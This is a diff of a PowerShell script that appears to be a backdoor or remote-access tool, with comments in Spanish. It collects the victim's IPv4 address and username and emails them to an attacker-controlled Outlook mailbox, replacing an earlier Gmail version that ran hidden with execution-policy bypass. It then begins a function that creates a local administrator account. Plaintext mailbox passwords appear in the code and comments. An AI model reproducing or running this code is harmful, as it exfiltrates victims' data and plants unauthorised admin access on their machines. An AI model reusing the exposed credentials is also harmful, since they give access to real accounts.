@@ -11,14 +11,10 @@ $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = $PWD.Path
  
+#processdata@outlook.es
+#procesandodatos123$!
 #enviando ip por smtp
-powershell -windowstyle hidden -ep bypass $smtp_e = "robertogonzalez6662@gmail.com";
-$smtp_p = "BobEsponja123$!";
-$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress  | Out-String;
-$subject = "$env:UserName logs";
-$smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
-$smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($smtp_e, $smtp_p);
-$smtp.Send($smtp_e, $smtp_e, $subject, $ip);
+powershell $EmailFrom = "processdata@outlook.es";$EmailTo = "processdata@outlook.es";$Subject = "Nueva conexión:";$SMTPServer = "smtp.outlook.com";$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress | Out-string;$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPClient.EnableSsl = $true;$message = New-Object System.Net.Mail.MailMessage $EmailFrom, $EmailTo;$message.Subject = $Subject;$message.IsBodyHTML = $true;$message.Body = "$ip";$pass = Read-Host "procesandodatos123$!" -AsSecureString; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $pass); $SMTPClient.Send($message)
 
 #Creando administrador local
 function Create-NewLocalAdmin {
